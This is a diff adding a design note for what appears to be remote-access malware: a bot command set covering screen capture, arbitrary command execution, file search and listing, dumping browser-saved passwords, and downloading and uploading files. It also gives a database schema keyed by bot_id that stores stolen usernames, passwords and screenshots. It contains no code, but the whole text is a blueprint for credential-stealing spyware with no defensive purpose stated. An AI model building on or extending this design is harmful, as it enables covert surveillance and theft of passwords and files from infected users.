@@ -1,0 +1,39 @@
+command set:
+1. capture screen
+	mode: capture only 1 time
+	syntax: scr 1
+	mode: capture every x s
+	syntax: scr -t x
+2. excecute command
+	cli command
+3. search file in computer
+	sch [filename]
+4. list folder in computer
+	lst 
+5. get list of password saved
+	pas 
+6. download file from internet
+	dwn [link]
+7. upload file from computer to server
+	upl [file path]
+database design:
+table commands has command set
+	table name: command_set
+	columns: bot_id,command_type,command_info,command,status,result
+		command_type: 1->6
+		command_info: 
+			1: capture screen
+			2: excecute command
+			3: search file
+			4: list folder in computer
+			5: get list of password browser saved
+			6: download a file from internet
+			7: upload file from computer to server
+2 table for result of command type
+	table: commandline_result,password_result,screen_shot 
+	commandline_result
+		columns: bot_id,command_type,command,result
+	password_result
+		columns: bot_id,user_name,password,link
+	screen_shot
+		columns: bot_id,link,time
